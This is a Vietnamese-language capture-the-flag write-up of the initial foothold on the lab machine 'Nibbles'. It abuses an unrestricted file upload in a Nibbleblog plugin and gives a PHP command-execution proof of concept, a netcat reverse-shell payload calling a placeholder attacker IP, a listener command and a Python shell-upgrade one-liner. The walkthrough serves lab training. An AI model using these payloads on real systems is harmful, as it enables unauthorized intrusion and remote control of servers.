# Tóm tắt: Nibbles - Initial Foothold (Chiếm quyền ban đầu)

## 1. Tìm điểm yếu trên Trang quản trị

Sau khi đăng nhập vào Dashboard quản trị, rà soát các tính năng và phát hiện mục tiêu khả thi tại phần **Plugins**:
* Plugin **"My image"** cho phép tải file lên máy chủ.
* Đây là lỗ hổng để thực hiện tấn công **File Upload**, cho phép tải mã độc PHP lên hệ thống.

---

## 2. Kiểm tra Thực thi mã từ xa (RCE Proof of Concept)

**Bước 1:** Tạo một đoạn mã PHP đơn giản để kiểm tra xem server có chạy lệnh hệ thống không.
```php
<?php system('id'); ?>
```

**Bước 2:** Tải file này lên thông qua plugin "My image". Mặc dù hệ thống báo lỗi hình ảnh, file vẫn được lưu thành công.

**Bước 3:** Xác định vị trí file tải lên và kích hoạt.
Đường dẫn mặc định của plugin này là:
`http://<host>/nibbleblog/content/private/plugins/my_image/image.php`

Khi truy cập đường dẫn trên, kết quả trả về thông tin `uid=1001(nibbler)`, xác nhận đã chiếm được quyền thực thi mã.

---

## 3. Thiết lập Reverse Shell

**Bước 4:** Chuẩn bị Payload.
Sửa đổi file PHP để chèn mã lệnh tạo kết nối ngược (Reverse Shell) về máy tấn công. Thay `<ATTACKING IP>` và `<PORT>` bằng thông tin máy của bạn.
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> 9443 >/tmp/f"); ?>
```

**Bước 5:** Khởi tạo Listener trên máy tấn công.
```
nc -lvnp 9443
```

**Bước 6:** Tải file payload lên lại và truy cập đường dẫn `image.php` để kích hoạt kết nối. Máy tấn công sẽ nhận được quyền truy cập Shell.

---

## 4. Nâng cấp Shell (Shell Stabilization)

Shell ban đầu rất hạn chế (không tương tác tốt). Cần nâng cấp lên TTY đầy đủ để hoạt động ổn định.

**Bước 7:** Kiểm tra và sử dụng Python để nâng cấp.
Máy chủ không có Python 2, nhưng có Python 3.
```python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Kết quả:**
* Đã có quyền truy cập ổn định vào hệ thống với user `nibbler`.
* Tìm thấy cờ `user.txt` và file `personal.zip` tại thư mục `/home/nibbler`.